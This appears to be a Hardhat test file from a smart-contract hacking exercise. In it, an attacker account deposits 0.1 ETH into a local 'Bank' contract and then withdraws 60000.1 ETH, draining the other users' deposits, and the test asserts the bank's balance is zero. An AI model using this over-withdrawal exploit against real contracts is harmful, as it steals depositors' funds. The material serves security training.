import '@nomiclabs/hardhat-ethers'
import { ethers } from 'hardhat'
import utils from '../utils'
import {BigNumber, Contract} from 'ethers'
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";

const fromEther = utils.fromEther
const toEther = utils.toEther

describe('Bank', async () => {
    let user0: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress
    let attacker: SignerWithAddress

    let bankContract: Contract

    before(async () => {
        [attacker, user0, user1, user2, ] = await ethers.getSigners()
        
        // attacker has about 1 ETH
        await attacker.sendTransaction({to: utils.DeadAddress, value: (await ethers.provider.getBalance(attacker.address)).sub(toEther(1))})
        console.log("balanceOf attacker at the beginning: ", fromEther(await ethers.provider.getBalance(attacker.address)))

        const Bank = await ethers.getContractFactory("Bank")
        bankContract = await Bank.deploy()
    })

    it('hack the bank', async() => {
        // Deposit 3 users
        await bankContract.connect(user0).deposit({value: toEther(10000)})
        await bankContract.connect(user1).deposit({value: toEther(20000)})
        await bankContract.connect(user2).deposit({value: toEther(30000)})

        //////////////////////////////////////////////////////////////////////////////////////
        // TODO: Withdraw all of depoist
        await bankContract.connect(attacker).deposit({value: toEther(0.1)})
        await bankContract.connect(attacker).withdraw(toEther(60000.1))
        //////////////////////////////////////////////////////////////////////////////////////

        const bankBalance = await ethers.provider.getBalance(bankContract.address)
        console.log("balanceOf attacker at the end: ", fromEther(await ethers.provider.getBalance(attacker.address)))
        utils.assertEqual(bankBalance, toEther(0))
        console.log("[Exploit Bank1] success")
    })
})
